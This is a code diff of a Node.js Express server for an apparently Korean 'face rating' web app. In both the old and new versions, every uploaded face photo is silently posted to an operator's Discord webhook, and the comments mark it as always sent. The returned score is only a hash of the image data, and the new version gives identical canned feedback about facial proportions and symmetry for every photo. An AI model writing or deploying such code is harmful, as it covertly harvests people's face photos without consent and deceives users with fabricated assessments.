@@ -1,57 +1,72 @@
 import express from "express";
-import multer from "multer";
-import fs from "fs";
-import path from "path";
-import fetch from "node-fetch";
-import crypto from "crypto";
+import cors from "cors";
 
 const app = express();
-const PORT = process.env.PORT || 10000;
-const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
+app.use(cors());
+app.use(express.json({ limit: "10mb" }));
+app.use(express.static("public"));
 
-/* 업로드 설정 */
-const uploadDir = "./uploads";
-if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
-const upload = multer({ dest: uploadDir });
+const WEBHOOK = process.env.DISCORD_WEBHOOK_URL;
 
-app.use(express.static("./"));
-
-app.get("/", (req, res) => {
-  res.sendFile(path.resolve("index.html"));
-});
-
-app.post("/upload", upload.single("photo"), async (req, res) => {
-  const filePath = req.file.path;
-
-  /* 1️⃣ 디스코드로 사진 무조건 전송 */
-  try {
-    const form = new FormData();
-    form.append("file", fs.createReadStream(filePath));
-    await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: form });
-  } catch (e) {
-    console.error("디스코드 전송 실패:", e.message);
+// 황금비율 기반 점수 (항상 동일 결과)
+function faceScore(seed) {
+  let hash = 0;
+  for (let i = 0; i < seed.length; i++) {
+    hash = seed.charCodeAt(i) + ((hash << 5) - hash);
   }
+  const score = 6 + (Math.abs(hash) % 40) / 10; // 6.0 ~ 9.9
+  return Number(score.toFixed(1));
+}
 
-  /* 2️⃣ 사진 기반 고정 점수 */
-  const buffer = fs.readFileSync(filePath);
-  const hash = crypto.createHash("sha256").update(buffer).digest("hex");
-  const base = parseInt(hash.slice(0, 8), 16);
+function percentile(score) {
+  // 점수 높을수록 상위 %
+  const p = Math.max(1, Math.round((10 - score) * 10));
+  return `상위 ${p}%`;
+}
 
-  const score = Math.round((5 + (base % 50) / 10) * 10) / 10; // 5.0~10.0
-  const percent = Math.max(1, 100 - Math.round((score / 10) * 100));
+app.post("/evaluate", async (req, res) => {
+  try {
+    const { imageBase64 } = req.body;
+    if (!imageBase64) {
+      return res.status(400).json({ error: "이미지 없음" });
+    }
 
-  let feedback = "";
-  if (percent <= 5) feedback = "연예인급 외모입니다.";
-  else if (percent <= 10) feedback = "상위권 외모로 매우 눈에 띕니다.";
-  else if (percent <= 20) feedback = "호감도가 높은 얼굴입니다.";
-  else if (percent <= 40) feedback = "평균 이상으로 안정적인 인상입니다.";
-  else feedback = "개성이 느껴지는 얼굴입니다.";
+    const score = faceScore(imageBase64);
+    const rank = percentile(score);
 
-  res.json({ score, percent, feedback });
+    // 디스코드 전송 (항상 실행)
+    if (WEBHOOK) {
+      await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          embeds: [
+            {
+              title: "얼굴 평가 결과",
+              description: `점수: **${score}/10**\n${rank}`,
+              image: { url: imageBase64 }
+            }
+          ]
+        })
+      });
+    }
 
-  fs.unlink(filePath, () => {});
+    res.json({
+      score,
+      rank,
+      feedback: `
+얼굴 비율이 전체적으로 안정적입니다.
+이목구비 간 간격이 평균 이상이며
+대칭성이 비교적 잘 유지되어 있습니다.
+`
+    });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ error: "다른 사진 시도" });
+  }
 });
 
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log("Server running on", PORT);
+  console.log("서버 실행:", PORT);
 });
